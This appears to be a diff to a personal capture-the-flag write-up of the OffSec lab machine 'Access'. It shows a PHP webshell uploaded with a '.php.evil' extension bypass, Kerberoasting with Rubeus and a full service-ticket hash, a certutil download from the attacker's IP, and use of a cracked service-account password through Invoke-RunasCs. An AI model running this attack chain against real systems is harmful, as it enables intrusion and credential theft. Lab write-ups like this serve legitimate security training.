@@ -148,47 +148,151 @@ Upload
 
 [http://192.168.129.187/uploads/simple-backdoor.php.evil](http://192.168.129.187/uploads/simple-backdoor.php.evil?cmd=whoami)
 
+https://www.revshells.com/
+
 ![](../../../assets/images/Pasted%20image%2020260609120249.png)
-
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
 
 ---
 
 # Initial Access
 
-```zsh
+![](../../../assets/images/Pasted%20image%2020260610023910.png)
 
+![](../../../assets/images/Pasted%20image%2020260610024020.png)
+
+http://192.168.215.187/uploads/revshell.php.evil
+
+![](../../../assets/images/Pasted%20image%2020260610024113.png)
+
+# Enum
+
+## .env
+```zsh
+c:\Users\svc_apache\Documents>set
+ALLUSERSPROFILE=C:\ProgramData
+APPDATA=C:\Users\svc_apache\AppData\Roaming
+CommonProgramFiles=C:\Program Files\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=SERVER
+ComSpec=C:\Windows\system32\cmd.exe
+DriverData=C:\Windows\System32\Drivers\DriverData
+LOCALAPPDATA=C:\Users\svc_apache\AppData\Local
+NUMBER_OF_PROCESSORS=2
+OS=Windows_NT
+Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\svc_apache\AppData\Local\Microsoft\WindowsApps
+PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
+PROCESSOR_ARCHITECTURE=AMD64
+PROCESSOR_IDENTIFIER=AMD64 Family 25 Model 1 Stepping 1, AuthenticAMD
+PROCESSOR_LEVEL=25
+PROCESSOR_REVISION=0101
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSModulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
+PUBLIC=C:\Users\Public
+SystemDrive=C:
+SystemRoot=C:\Windows
+TEMP=C:\Users\SVC_AP~1\AppData\Local\Temp
+TMP=C:\Users\SVC_AP~1\AppData\Local\Temp
+USERDNSDOMAIN=ACCESS.OFFSEC
+USERDOMAIN=ACCESS
+USERNAME=svc_apache
+USERPROFILE=C:\Users\svc_apache
+windir=C:\Windows
+AP_PARENT_PID=3400
 ```
 
 ```zsh
+c:\Users\svc_apache\Documents>.\winPEASx64.exe
+```
 
+```zsh
+┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Access]
+└─$ cp /usr/share/windows-resources/rubeus/Rubeus.exe . 
+```
+
+```zsh
+c:\Users\svc_apache\Documents>.\Rubeus.exe kerberoast /nowrap
+
+   ______        _                      
+  (_____ \      | |                     
+   _____) )_   _| |__  _____ _   _  ___ 
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.6.4 
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : svc_mssql
+[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
+[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
+[*] PwdLastSet             : 5/21/2022 12:33:45 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*svc_mssql$access.offsec$MSSQLSvc/DC.access.offsec*$914327B72ECF911B43A84FF2D10AC30B$2202DB63188A7A3DC9B420265C33A65C52A7E982D559255011C12AD4D318B87A0B4CD0F642657A5F5411B018ADBD12829BC079696D47342E522F90F4828665027CFBE59945AA2D83612FBF447A24EFB046ED6D29626DAB2009193ADFAA059C65D33C0CED48FF7A45582913B974CF8F04569108DB1FD80D8F215482E9E1D977BD2195FBA84D8EA67C535763E8F506BDF808F320DE72E983B2E5E537BE3C6B6002343B4740BC3737EECC8A7E7532F269BCAF9224382BDC72B01095AFBB0052E5B4ADBD1F6463B24E7C673D094AD6E346D8462F121FFEB32935AD662BE2BBDE54A16157DA9E8DFC2FF0795F2CA3BBC7B25EAECF95ED5321EEAAD227148F21E746618186526DB4ABA2A3CBD3D971FE42E55C7384EB55DF70A5EF67AD215CA92F28ACAEA3EB15784C4CF283E1B4B14101E53EE16EF234641C5CE76427225410F9AB41BCCDDAA2F79020DE7CFD4C3BBDA759D21142A02C3FB4BA44A896953891941707AA1FD9EC504CB551C9A41CDFD47055AC10BFF8D14B7B6B1F2BBE6CCC94A13FE2FFA30414A5F640FD1369721329A41DF7C4ED2641985CA059553FD8AE4E955FFF94E1242449343058DF324E15721FC6C214F858F553121B7CDFC3070D06D2DCB18B0DCB6E3D42F7FD55775DF1B1A4C4EBB50A41ACE16F7BBDD1025E4E02DB7286E1D1E61DB9D7A4D960A12A62DB8578EC903EFD7953979E187AC7D355950278501CAE2F0ACE6061EAA3D8CC58E7F19FAF503DFF17380469E1DF8B9BE4D3A4EAB4983B57B7D7BF025BEA1A729BACE329B1A6E4B2FF2DD84337AAE81AABBED233710879B4A7EF224F4236B4681146C8C6E59D775A2DC4E367D486196DFDC0DCFB6D799CB431FD548B2CC2584DF770D44729D665DF0CAC28DE8AC501DBEF3F74168A9C0DDBDF13A7DD600E9C42DEAB2B3B4D7F27CA7A9DFB354518FAEF72D1F85780E72E93FD724D0DBE9F8C870638B0865359898C0618A50E2ACE4B4691839D1D6B79F23E3AF33E5920E77AB1875A47ED76FE23D3E49ADAD3F8251F0B1DB70067F1BB000F71D96E54B6B3E933F880D26A287C6E48AE87EFE33189BBAA8E389B55783B5EA1DE7501C1473F980ED7FE7F8A42011D586BF3067B69D34DC56D9E8D2C4CBF7EBC735729BC493A043912640F7A61B5ABCB655EFC1185BAB9A8A704A57DED6B8B503966B0701AFB5316F66D7B8A0C982CF82C6FBE3939DE0B5352578A810CA7E735AB285C7E6DF8F4CA8592422CE4F132FEA770E46A5197EF06B155376A1AA394AE46822995339E994A436823DE1A018A4339FEC9E14455C4766DF7FE17B1301ECB191A0889469DD1F684D9D9FD4C4F67974EDE667856A43B43CA2B12566D7040593E41C08BC7B288B4FEE8437E27A445C7A9067099AB29B6EA5B113DD7F84B59E512C8027476011663F7EACE241F6702B85F0559EAFBF02596C67FB3C4F2A7BA0C38C06CDCAC67A9ACDF61FD2FA38B77507CECA22968BAAC6EC66D00D9E47643F03F5DF3A77927D43C7A833A5899A68C5D930DC07FF5DE03AFAE6AF31D822296B7DFEF6AE0EFEE6AFC6626E096F3DF182A14598B75A246CF8186272FDD988B3806500F6870FC1EC1B02F472FBBA6FA57
+```
+
+https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
+
+```powershell
+PS C:\certutil -urlcache -f http://192.168.45.212/Invoke-RunasCs.ps1 Invoke-RunasCs.ps1
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+```
+
+```powershell
+PS C:\Users\svc_apache\Documents> import-module .\Invoke-RunasCs.ps1
+```
+
+```powershell
+PS C:\Users\svc_apache\Documents> . .\Invoke-RunasCs.ps1
+```
+
+```powershell
+PS C:\Users\svc_apache\Documents> Get-Command Invoke-RunasCs
+
+CommandType     Name                                               Version    Source                                   
+-----------     ----                                               -------    ------                                   
+Function        Invoke-RunasCs                                              
+```
+
+```powershell
+PS C:\Users\svc_apache\Documents> Get-ExecutionPolicy
+Bypass
+
+PS C:\Users\svc_apache\Documents> Invoke-RunasCs svc_mssql trustno1 whoami
+[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+access\svc_mssql
+```
+
+```zsh
+PS C:\xampp\htdocs\uploads> invoke-runascs svc_mssql trustno1 "whoami /priv"
+[*] Warning: The logon for user 'svc_mssql' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                      State   
+============================= ================================ ========
+SeMachineAccountPrivilege     Add workstations to domain       Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks Disabled
+SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled
 ```
 
 ```zsh
@@ -225,39 +329,6 @@ Upload
 ```zsh
 
 ```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
-```zsh
-
-```
-
 
 <details markdown="1">
 <summary>Walkthrough</summary>
